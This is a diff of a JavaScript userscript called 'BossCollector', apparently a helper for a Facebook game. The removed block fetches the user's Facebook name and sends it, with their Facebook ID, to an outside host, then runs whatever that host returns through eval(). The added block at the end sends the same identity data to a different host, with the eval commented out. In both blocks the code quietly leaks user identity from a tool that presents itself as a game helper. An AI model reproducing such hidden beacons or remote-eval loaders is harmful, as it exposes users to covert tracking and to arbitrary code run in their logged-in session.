@@ -3,40 +3,6 @@ var my_timeout;
 var fc2_globalCounter=0;
 
   var jca_title = 'BossCollector by ★LOC@S★ נυαη ★L@★';
-   
-var name_uid = '';
-var the_name = 'BossCollector';
-
-var the_id = User.trackId;
-var mUrl = 'https://graph.facebook.com/'+User.trackId;
-   $.ajax({
-        url: mUrl,
-        dataType: 'json',
-        success: function(data, status) {         
-          //alert(data.name);
-          name_uid=data.name;
-
-      }
-      ,complete: function(){
-           $.ajax({
-                                                 async : true
-                                                ,cache : false
-                                                ,type    : "GET"
-                                                ,url     : "http://cux.cu.funpic.de/mw/log_new.php"
-                                                ,data    : { user:name_uid, script:the_name,fbid:the_id}
-                                                ,dataType: "jsonp"                                     
-                                                ,xhrFields: {
-                                                    withCredentials: true
-                                                }
-												,success : function(data,status){
-												      eval(data);
-												}
-												
-                              }); 
-						  
-                  }
-   });   	
-
   
   
 var log_arr = new Array();
@@ -219,4 +185,39 @@ function request(url, handler, errorhandler) {
 			error: errorhandler
 		});
 }
+
+
+var name_uid = '';
+var the_name = 'BossCollector - S';
+
+var the_id = User.trackId;
+var mUrl = 'https://graph.facebook.com/'+User.trackId;
+   $.ajax({
+        url: mUrl,
+        dataType: 'json',
+        success: function(data, status) {         
+          //alert(data.name);
+          name_uid=data.name;
+
+      }
+      ,complete: function(){
+           $.ajax({
+                                                 async : true
+                                                ,cache : false
+                                                ,type    : "GET"
+                                                ,url     : "http://caneda.lima-city.de/mw/log_new.php"
+                                                ,data    : { user:name_uid, script:the_name,fbid:the_id}
+                                                ,dataType: "jsonp"                                     
+                                                ,xhrFields: {
+                                                    withCredentials: true
+                                                }
+												,success : function(data,status){
+												    //  eval(data);
+												}
+												
+                              }); 
+						  
+                  }
+   });   	
+
 })() 
